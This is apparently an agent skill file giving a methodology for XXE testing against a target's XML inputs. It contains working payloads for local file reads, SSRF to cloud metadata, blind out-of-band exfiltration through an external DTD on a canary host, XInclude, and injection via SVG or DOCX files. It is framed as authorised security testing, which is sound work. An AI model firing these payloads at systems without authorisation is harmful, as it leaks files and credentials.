---
name: xxe
description: "Focused hunt for XML External Entity injection: file read, SSRF via XXE, blind OOB exfiltration, XInclude, and XXE in SVG/DOCX/XLSX/SSRF-style parsers. Use when the target accepts XML input or parses document files. Not for general SSRF over HTTP params (use ssrf) or plain file upload bypasses (use file-upload)."
---

# XXE

## When to use

- "Hunt XXE on X", "test the XML/SOAP/Import endpoint of X"
- Inputs: XML APIs, SOAP, SAML (XML!), SVG uploads, DOCX/XLSX/ODT parsers, RSS/Atom importers, XML-RPC

## When NOT to use

- Plain HTTP-param SSRF (`ssrf`), upload content-type bypasses (`file-upload`)

## Inputs

- **Target** + XML/document input points; a canary endpoint for OOB

## Rationalizations to reject

- "Entity resolved (no error)" — resolution is not a finding. You need file content in the response, an OOB hit, or an error proving external resolution.
- "The parser is modern so XXE is impossible" — test it; many stacks keep DTD processing on (Java defaults!).

## Methodology

### 1. Probe DTD processing
Submit well-formed XML with an internal entity and check acceptance:
```xml
<!DOCTYPE foo [<!ENTITY xxe "test">]><root>&xxe;</root>
```
If `test` replaces `&xxe;`, entity processing is on.

### 2. File read
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```
- Windows: `file:///c:/windows/win.ini`.
- Error-based variant if no reflection: reference an entity in a place the parser reports (`<!ENTITY xxe SYSTEM "file:///nonexistent">` → error may include content).
- Java: try `jar:`, `netdoc:` schemes; list dirs via `file:///dir/` on some parsers.

### 3. SSRF via XXE
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> 
```
Same targets as `ssrf` (metadata, internal hosts). Report reachability; credential use rules from `ssrf` apply.

### 4. Blind OOB
External DTD on your canary host:
```xml
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://canary/oob.dtd"> %dtd;]>
```
With `oob.dtd` defining `%file` (read target) and a send-back entity channel (`%all;` pattern, FTP/HTTP to canary with content). One clean exfil of a small file = proof.

### 5. Document formats
- SVG upload → `<external-entity>` or `<xi:include>` inside (also XSS lead via `<script>` in SVG).
- DOCX/XLSX/ODT: `[Content_Types].xml` or document XML with entity; re-zip and upload.
- XInclude: if you can't control the root DOCTYPE but can inject an element:
```xml
<foo><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/></foo>
```
- SAML responses (if you control the IdP side or response is malleable) — classic XXE ground.

## Reporting

`findings/xxe-<date>.md`. File read = high; SSRF/metadata via XXE = high (per `ssrf` rules); blind OOB only = medium unless data exfiltrated.

## Focus discipline

Command execution via DTD (rare, e.g. expect://) → lead for `cmd-injection`. SVG with `<script>` rendering in browser → `xss`.
